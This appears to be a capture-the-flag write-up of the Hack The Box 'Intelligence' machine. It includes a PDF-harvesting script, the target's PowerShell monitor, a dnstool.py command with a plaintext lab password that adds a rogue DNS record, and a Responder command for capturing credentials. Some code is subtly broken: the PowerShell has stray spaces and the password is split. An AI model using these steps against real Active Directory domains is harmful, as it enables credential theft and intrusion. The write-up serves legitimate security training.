findpdfs.py
```python
#!/usr/bin/env python3
import datetime
import io
import PyPDF2
import requests

t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']

users = set()

while True:
    url = t.strftime("http://ip/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    print(f'----- {url}\n')

    if resp.status_code == 200:
        print(f'----- {url} get success!\n')
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            u = pdf.getDocumentInfo()['/Creator']
            print(f'---- {url} Creator: {u}')
            users.add(u)

            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                print(f'---- {url} : {text}\n')

                if any(k in text.lower() for k in keywords):
                    print(f'==={url}===\n{text}')

    t += datetime.timedelta(days=1)
    if t >= end:
        break

with open('user.list', 'w') as f:
    for u in users:
        f.write(u + '\n')
```

```powershell
# Check web server status. Scheduled to run every 5min
Import - Module ActiveDirectory 
foreach($record in Get - ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where - Object Name  - like "web*") {
    try {
        $request = Invoke - WebRequest  - Uri "http://$($record.Name)"  - UseDefaultCredentials

    } catch {}
}
```
The script periodically contacted hosts whose AD DNS names began with web, authenticated as its running account, and emailed an alert when a request failed or returned a status other than HTTP 200.

#### Recap
Predictable PDF filenames exposed more documents, account names, and a weak password. Password reuse gave access to the IT share and its monitoring script. The script trusted writable AD DNS records when selecting hosts and authenticated to them using its running account.
```bash
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser 9876 -dns-ip 10.129.95.154 --action add --record web-exp --data 10.10.15.73 --type A intelligence.htb

sudo responder -I tun 0 -wv
```
The monitoring script ran approximately every five minutes. Its authentication exposed another user's credentials. That user's group could read the managed password for SVC_INT$, whose constrained delegation rights exposed an administrator service identity. The resulting access yielded the root flag.
